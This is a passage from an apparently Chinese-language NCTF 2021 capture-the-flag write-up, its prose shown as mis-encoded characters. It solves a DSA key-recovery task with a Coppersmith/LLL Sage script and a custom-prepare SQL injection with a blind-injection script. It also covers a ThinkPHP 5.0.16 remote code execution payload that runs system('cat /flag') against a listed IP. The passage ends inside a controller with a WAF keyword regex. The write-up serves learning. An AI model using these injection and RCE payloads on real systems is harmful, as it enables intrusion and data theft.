class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keygen</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(<span class="number">522</span>)</span><br><span class="line">        q = p//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> isPrime(q):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    g = <span class="number">3</span></span><br><span class="line">    h = long_to_bytes(getPrime(<span class="number">256</span>))</span><br><span class="line">    x = <span class="built_in">int</span>.from_bytes(h*<span class="number">2</span>, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">    y = <span class="built_in">pow</span>(g, x, p)</span><br><span class="line">    <span class="keyword">return</span> g, p, q, y, x</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span>(<span class="params">h, x</span>):</span></span><br><span class="line">    k = sha256(h.encode().<span class="built_in">hex</span>().encode()).digest()+sha256(<span class="built_in">bytes</span>.fromhex(h)+x.to_bytes(<span class="number">128</span>, <span class="string">&quot;big&quot;</span>)).digest()</span><br><span class="line">    k = <span class="built_in">int</span>.from_bytes(k, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">    r = <span class="built_in">pow</span>(g,k,p)</span><br><span class="line">    s = (r*x+<span class="built_in">int</span>(h,<span class="number">16</span>))*inverse(k,q)%q</span><br><span class="line">    <span class="keyword">return</span> r, s</span><br><span class="line"></span><br><span class="line">g, p, q, y, x = keygen()</span><br><span class="line">flag = <span class="built_in">int</span>(flag[<span class="number">5</span>:-<span class="number">1</span>],<span class="number">16</span>)^<span class="built_in">int</span>(sha256(x.to_bytes(<span class="number">128</span>, <span class="string">&quot;big&quot;</span>)).hexdigest(),<span class="number">16</span>)</span><br><span class="line">r, s = sign(<span class="built_in">hex</span>(flag)[<span class="number">2</span>:], x)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(q)</span><br><span class="line"><span class="built_in">print</span>(y)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">4065074330205980877463463424406813850154275302695361748314870346411329051948044450952905063182483477758495116696164996888846308775044737816809015524088898203</span></span><br><span class="line"><span class="string">7743982251072012463264403932580827621959049035277930304818871889119878506480333248188293037455476433705911511645160292331990658781048396135284434991466243636</span></span><br><span class="line"><span class="string">19480592192543881131267167328019941277106895469291691207381812905033306766991</span></span><br><span class="line"><span class="string">962433004607153392099715322793248884218264181538005666659905851247468102959956625098831516046715446615198437005036117685792905736788216987378584513020215442</span></span><br><span class="line"><span class="string">1861254747644911591100925843087118347161726578606012243057783788330822542299254180561801871884967022902307837045926190782819951409650425825871898890839825777</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></blockquote><p>DSAç­¾åç®—æ³•ï¼Œå°†æ˜æ–‡ $m$ ä¸ç§é’¥ $x$ å“ˆå¸Œå€¼ $h(x)$ çš„å¼‚æˆ–å€¼ $H=m \oplus h(x)$ ä¼ å…¥<code>sign()</code> å‡½æ•°ï¼Œå¹¶å°† $H$ ä¸ $h(H+x)$ è¿æ¥å¾—åˆ°çš„ $k$ ä½œä¸ºä¸´æ—¶å¯†é’¥ï¼Œè®¡ç®— $r=g^k \bmod p$ å’Œ $s=(rx+H)k^{-1} \bmod q$ï¼Œç»™å‡ºç­¾åç»“æœ $(r,s)$ï¼Œæ±‚ç§é’¥ $x$ã€‚</p><p>å·²çŸ¥ $g,q,p=2q+1,y,H,r,s$ï¼Œ$x$ ä¸º512ä½ï¼Œæ ¹æ® <code>x = int.from_bytes(h*2, &quot;big&quot;)</code> å¯çŸ¥  $x \mid (2^{256}+1)$ï¼Œè®¾ $x=(2^{256}+1)dâ€™$ï¼Œåˆ™ $dâ€™$ ä¹Ÿæ˜¯256ä½ã€‚</p><p>$k$ ç”± $H$ ä¸ $h(H+x)$ è¿æ¥å¾—åˆ°ï¼Œ$H$ å·²çŸ¥ï¼Œå³ $k$ çš„é«˜256ä½å·²çŸ¥ï¼Œä½256ä½æœªçŸ¥ï¼Œè®¾ $k=2^{256}H+hâ€™$ã€‚</p><p>æ ¹æ® $s=(rx+H)k^{-1} \bmod q$ï¼Œæœ‰ï¼š</p><p>$(2^{256}H+hâ€™)s-(2^{256}+1)dâ€™r-H \equiv 0 \pmod q$ </p><p>åˆ©ç”¨coppersmithå®šç†æ„é€ æ ¼ï¼Œé€šè¿‡LLLç®—æ³•è®¡ç®— $(hâ€™,dâ€™)$ï¼Œè¿™é‡Œé‡‡ç”¨small_rootsè„šæœ¬æ”»å‡»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Sage</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">d = f.degree()</span><br><span class="line"></span><br><span class="line">R = f.base_ring()</span><br><span class="line">N = R.cardinality()</span><br><span class="line"></span><br><span class="line">f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m+<span class="number">1</span>):</span><br><span class="line">base = N^(m-i) * f^i</span><br><span class="line"><span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">G.append(g)</span><br><span class="line"></span><br><span class="line">B, monomials = G.coefficient_matrix()</span><br><span class="line">monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line"><span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">B = B.change_ring(QQ)</span><br><span class="line"><span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">B.rescale_col(i, <span class="number">1</span>/factor)</span><br><span class="line"></span><br><span class="line">H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B*monomials):</span><br><span class="line">H.append(h)</span><br><span class="line">I = H.ideal()</span><br><span class="line"><span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">H.pop()</span><br><span class="line"><span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">roots = []</span><br><span class="line"><span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">roots.append(root)</span><br><span class="line"><span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">q=<span class="number">4065074330205980877463463424406813850154275302695361748314870346411329051948044450952905063182483477758495116696164996888846308775044737816809015524088898203</span></span><br><span class="line">g=<span class="number">3</span></span><br><span class="line">y=<span class="number">7743982251072012463264403932580827621959049035277930304818871889119878506480333248188293037455476433705911511645160292331990658781048396135284434991466243636</span></span><br><span class="line">h=<span class="number">19480592192543881131267167328019941277106895469291691207381812905033306766991</span></span><br><span class="line">r=<span class="number">962433004607153392099715322793248884218264181538005666659905851247468102959956625098831516046715446615198437005036117685792905736788216987378584513020215442</span></span><br><span class="line">s=<span class="number">1861254747644911591100925843087118347161726578606012243057783788330822542299254180561801871884967022902307837045926190782819951409650425825871898890839825777</span></span><br><span class="line">p=<span class="number">2</span>*q+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">kmax=<span class="built_in">int</span>(sha256(<span class="built_in">hex</span>(h)[<span class="number">2</span>:].encode().<span class="built_in">hex</span>().encode()).digest().<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">PR.&lt;h_, d_&gt; = PolynomialRing(Zmod(q))</span><br><span class="line"></span><br><span class="line">f = (<span class="number">2</span>^<span class="number">256</span> * kmax + h_) * s  - (<span class="number">2</span>^<span class="number">256</span> + <span class="number">1</span>) * d_ * r - h</span><br><span class="line">roots = small_roots(f, [<span class="number">2</span>^<span class="number">256</span>, <span class="number">2</span>^<span class="number">256</span>],  d=<span class="number">4</span>, m=<span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(roots)</span><br><span class="line"><span class="keyword">for</span> root <span class="keyword">in</span> roots:</span><br><span class="line">    kmin = Integer(root[<span class="number">0</span>])</span><br><span class="line">    k = (<span class="number">2</span>^<span class="number">256</span> * kmax + kmin)</span><br><span class="line">    x_ = Integer(root[<span class="number">1</span>])</span><br><span class="line">    x_ = (<span class="number">2</span>^<span class="number">256</span> + <span class="number">1</span>) * x_</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">pow</span>(g, x_, p) == y:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] found: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(x_))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] wrong: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(x_))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(x_)</span><br><span class="line">flag = <span class="built_in">hex</span>(<span class="built_in">int</span>(sha256(<span class="built_in">int</span>(x_).to_bytes(<span class="number">128</span>, <span class="string">&quot;big&quot;</span>)).hexdigest(),<span class="number">16</span>) ^^ h)[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1d92dae504a70fbcae6d3721a55d7eacaf94d3133ea5f0394b7d203d64841110</span></span><br></pre></td></tr></table></figure><p>åŠ ä¸Šå¤–å£³ï¼Œflagï¼š<code>nctf&#123;1d92dae504a70fbcae6d3721a55d7eacaf94d3133ea5f0394b7d203d64841110&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h3><blockquote><p>è¿™è¿˜èƒ½æ³¨å…¥å—</p><p>Hint 1: å¦ä¸€åŠflagåœ¨æ•°æ®åº“ä¸­</p></blockquote><p><code>www.zip</code> ä¸­ä¸‰ä¸ªæ–‡ä»¶ <code>config.php</code>ã€<code>DB.php</code>ã€<code>login.php</code>ã€‚</p><p><code>login.php</code> ä¸­ä¸»é€»è¾‘ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$query</span> = db::prepare(<span class="string">&quot;SELECT * FROM `users` where password=md5(%s)&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]); <span class="comment">// (1)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$query</span> = db::prepare(<span class="variable">$query</span> . <span class="string">&quot; and name=%s&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]); <span class="comment">// (2)</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$query</span> = <span class="variable">$query</span> . <span class="string">&quot; and name=&#x27;benjaminEngel&#x27;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$query</span> = <span class="variable">$query</span> . <span class="string">&quot; limit 1&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$result</span> = db::commit(<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;NCTF&#123;ez&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Wrong name or password.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>db::prepare</code> é¢„å¤„ç†sqlè¯­å¥ã€‚</p><p>è·Ÿè¿› <code>DB.php</code> çœ‹ <code>prepare()</code> å‡½æ•°çš„å®šä¹‰ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">prepare</span>(<span class="params"><span class="variable">$query</span>, <span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> (is_null(<span class="variable">$query</span>))&#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strpos(<span class="variable">$query</span>, <span class="string">&#x27;%&#x27;</span>) === <span class="literal">false</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;%s not included in query!&#x27;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// get args</span></span><br><span class="line"><span class="variable">$args</span> = func_get_args();</span><br><span class="line">array_shift( <span class="variable">$args</span> );</span><br><span class="line"></span><br><span class="line"><span class="variable">$args_is_array</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (is_array(<span class="variable">$args</span>[<span class="number">0</span>]) &amp;&amp; count(<span class="variable">$args</span>) == <span class="number">1</span> ) &#123; <span class="comment">// (3)</span></span><br><span class="line"><span class="variable">$args</span> = <span class="variable">$args</span>[<span class="number">0</span>];</span><br><span class="line"><span class="variable">$args_is_array</span> = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$count_format</span> = substr_count(<span class="variable">$query</span>, <span class="string">&#x27;%s&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$count_format</span> !== count(<span class="variable">$args</span>))&#123; <span class="comment">// (4)</span></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;Wrong number of arguments!&#x27;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// escape</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$args</span> <span class="keyword">as</span> &amp;<span class="variable">$value</span>)&#123;</span><br><span class="line"><span class="variable">$value</span> = <span class="built_in">static</span>::<span class="variable">$db</span>-&gt;real_escape_string(<span class="variable">$value</span>); <span class="comment">// (5)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// prepare</span></span><br><span class="line"><span class="variable">$query</span> = str_replace(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;&#x27;%s&#x27;&quot;</span>, <span class="variable">$query</span>); <span class="comment">// (6)</span></span><br><span class="line"><span class="variable">$query</span> = vsprintf(<span class="variable">$query</span>, <span class="variable">$args</span>); <span class="comment">// (7)</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$query</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>(3)å¤„ <code>prepare()</code> å‡½æ•°æ¥æ”¶çš„ <code>$args</code> ä¸ºæ•°ç»„ï¼Œ(4)å¤„ åˆ¤æ–­æ¥æ”¶å‚æ•°æ•°é‡å’Œ <code>%s</code> æ•°é‡æ˜¯å¦ä¸€è‡´ï¼Œ(5)å¤„è½¬ä¹‰ç‰¹æ®Šå­—ç¬¦ï¼Œ(6)å¤„ç»™ <code>%s</code> åŒ¹é…çš„å‚æ•°å€¼åŠ å•å¼•å·ï¼Œ(7)å¤„æ›¿æ¢ <code>$query</code> ä¸­å¯¹åº”çš„ <code>%s</code> ä¸ºå‚æ•°å€¼ã€‚</p><p>åœ¨(1)çš„passwordå’Œ(2)çš„nameå¤„éƒ½ä½¿ç”¨äº†æ ¼å¼åŒ–å­—ç¬¦ä¸² <code>%s</code>ï¼Œå¯ä»¥åœ¨(1)å¤„ä¼ å…¥ <code>%s</code> å¹²æ‰°åŒ¹é…ï¼Œå¹¶åœ¨(2)å¤„ä¼ å…¥æ•°ç»„åŒ¹é…ä¸¤å¤„ <code>%s</code>ï¼š</p><p><code>password=%s</code>ï¼Œ<code>name[0]=) or 1=1 --</code>ï¼Œ<code>name[1]=x</code></p><p>sqlè¯­å¥ç”± <code>SELECT * FROM `users` where password=md5(%s) and name=%s limit 1</code></p><p>å˜ä¸º <code>SELECT * FROM `users` where password=md5() or 1=1 -- ) and name=x limit 1</code>ï¼Œå®ç°æ³¨å…¥ã€‚</p><p>POSTä¼ å‚è¯»åˆ°å‰åŠéƒ¨åˆ†flagï¼š<code>NCTF&#123;3v3ryth1ng_</code>ã€‚</p><p>æŠŠ <code>or 1=1</code> æ›¿æ¢ä¸ºå¸ƒå°”ç›²æ³¨ifè¯­å¥å³å¯æ‹¿åˆ°ååŠéƒ¨åˆ†flagï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://129.211.173.64:3080/login.php&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select(database())),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27;</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27;</span></span><br><span class="line">        <span class="comment"># payload = f&#x27;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span></span><br><span class="line">        payload = <span class="string">f&#x27;if(ascii(substr((select(group_concat(`fl@g`))from(`2021`.NcTF)),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)%23&#x27;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;%s&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;name[0]&#x27;</span>: <span class="string">f&quot;) or <span class="subst">&#123;payload&#125;</span> -- &quot;</span>,</span><br><span class="line">            <span class="string">&#x27;name[1]&#x27;</span>: <span class="string">&#x27;s&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># r = requests.get(url,params=data)</span></span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;NCTF&#123;3v3ryth1ng_&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># not_fantast1c_:)&#125;</span></span><br></pre></td></tr></table></figure><p>åˆå¹¶ï¼Œflagï¼š<code>NCTF&#123;3v3ryth1ng_not_fantast1c_:)&#125;</code></p><p>â€‹    </p><h3 id="æ‘†å°±å®Œäº‹äº†"><a href="#æ‘†å°±å®Œäº‹äº†" class="headerlink" title="æ‘†å°±å®Œäº‹äº†"></a>æ‘†å°±å®Œäº‹äº†</h3><blockquote><p>å•Šå¯¹å¯¹å¯¹ å¤ªå¯¹è¾£å¤ªå¯¹è¾£<br>If you get no idea about the problem,there is no harm in diffing the source code with the official one.</p></blockquote><p>è§‚å¯Ÿurlç»“æ„ <code>/public/index.php/index/index/index</code>ï¼Œç–‘ä¼¼ThinkPHPè·¯å¾„ï¼Œéšä¾¿æ”¹å†™æŠ¥é”™çŸ¥ä¸ºThinkPHP V5.0.16ã€‚</p><p>å°è¯•æœªå¼€å¯å¼ºåˆ¶è·¯ç”±RCEæ¼æ´ï¼ŒåŠ åç¼€ï¼š</p><p><code>http://129.211.173.64:8085/public/index.php/index/index/index?s=index/\think\view\driver\Php/display&amp;content=&lt;?php phpinfo();?&gt;</code></p><p>å‡ºç°phpinfoé¡µï¼Œæ”¹æˆ <code>&lt;?php%20system(&quot;cat /flag&quot;);?&gt;</code> æ‹¿åˆ°flagï¼š<code>nctf&#123;m1saka_wanna_kaibai&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="æ‘†å°±å®Œäº‹äº†2-0"><a href="#æ‘†å°±å®Œäº‹äº†2-0" class="headerlink" title="æ‘†å°±å®Œäº‹äº†2.0"></a>æ‘†å°±å®Œäº‹äº†2.0</h3><blockquote><p>å·èµ·æ¥ ä¸å‡†æ‘†ï¼</p></blockquote><p>ç‰ˆæœ¬åŒä¸Šï¼Œæ”¹äº†é€»è¾‘ï¼Œæœªå¼€å¯å¼ºåˆ¶è·¯ç”±RCEæ¼æ´æ— æ•ˆã€‚</p><p><code>www.zip</code> ä¸‹è½½æºç ï¼Œå‘ç°æ§åˆ¶å™¨ <code>applicaion/index/controller/M1sakaM1yuu.php</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: m1saka<span class="doctag">@x</span>1ct34m</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@blog</span>: www.m1saka.love</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/system| |\*|union|insert|and|into|outfile|dumpfile|infile|floor|set|updatexml|extractvalue|length|exists|user|regexp|;/i&quot;</span>, <span class="variable">$str</span>))&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">M1sakaM1yuu</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$username</span> = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line"><span class="variable">$str</span> = implode(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$username</span>);</span><br><span class="line"><span class="keyword">if</span> (waf(<span class="variable">$str</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;&lt;img src=&quot;http://www.m1saka.love/wp-content/uploads/2021/11/hutao.jpg&quot; alt=&quot;hutao&quot; 